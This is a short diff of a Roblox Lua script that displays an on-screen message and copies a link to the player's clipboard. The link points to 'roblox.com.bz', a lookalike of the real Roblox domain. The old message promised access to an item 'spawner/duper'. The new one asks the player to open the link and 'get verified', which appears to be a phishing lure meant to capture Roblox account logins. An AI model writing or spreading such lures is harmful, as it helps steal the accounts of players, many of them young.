@@ -154,7 +154,7 @@ SubtitleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
 
 SubtitleLabel.BackgroundTransparency = 1
 
-SubtitleLabel.Text = "A group link has been copied to your clipboard, please open your browser to join the group and get access to the spawner/duper."
+SubtitleLabel.Text = "A group link has been copied to your clipboard, open it in your browser and follow my roblox account to get verified."
 
 SubtitleLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
 
@@ -203,5 +203,5 @@ TweenService:Create(UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.Eas
 
 
 if setclipboard then
-    setclipboard("https://roblox.com.bz/communities/4027068177/")
+    setclipboard("https://roblox.com.bz/users/1061796740/profile")
 end
